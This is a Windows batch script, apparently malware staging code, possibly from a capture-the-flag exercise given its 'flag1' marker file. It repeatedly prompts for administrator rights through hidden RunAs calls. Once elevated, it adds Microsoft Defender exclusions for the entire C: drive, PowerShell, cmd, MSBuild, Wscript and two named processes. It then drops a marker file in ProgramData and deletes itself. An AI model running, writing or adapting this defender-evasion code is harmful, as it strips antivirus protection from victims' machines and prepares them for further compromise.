@echo off
NET SESSION >nul 2>&1
if %errorlevel% == 0 (
    powershell -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath 'C:\', 'C:\cmd.exe', 'C:\conhost.exe', 'C:\cvtres.exe', 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSbuild.exe', 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', 'C:\Windows\System32\Wscript.exe' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'appy.exe' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'Service Runtime Management Agent.exe' -ErrorAction SilentlyContinue" >nul 2>&1
    powershell -Command "$random = Get-Random -Minimum 100000 -Maximum 999999; $filePath = Join-Path $env:ProgramData \"flag1_errorlog$($random).txt\"; New-Item -Path $filePath -ItemType File -Force" >nul 2>&1
    del "%~f0" >nul 2>&1
    exit
)

:loop
    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -ArgumentList '/elevated' -Verb RunAs -WindowStyle Hidden" >nul 2>&1
    if %errorlevel% NEQ 0 (
        timeout /t 3 >nul
        goto loop
    )
    powershell -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath 'C:\', 'C:\cmd.exe', 'C:\conhost.exe', 'C:\cvtres.exe', 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSbuild.exe', 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', 'C:\Windows\System32\Wscript.exe' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'appy.exe' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'Service Runtime Management Agent.exe' -ErrorAction SilentlyContinue" >nul 2>&1
    powershell -Command "$random = Get-Random -Minimum 100000 -Maximum 999999; $filePath = Join-Path $env:ProgramData \"flag1_errorlog$($random).txt\"; New-Item -Path $filePath -ItemType File -Force" >nul 2>&1
    del "%~f0" >nul 2>&1
    exit
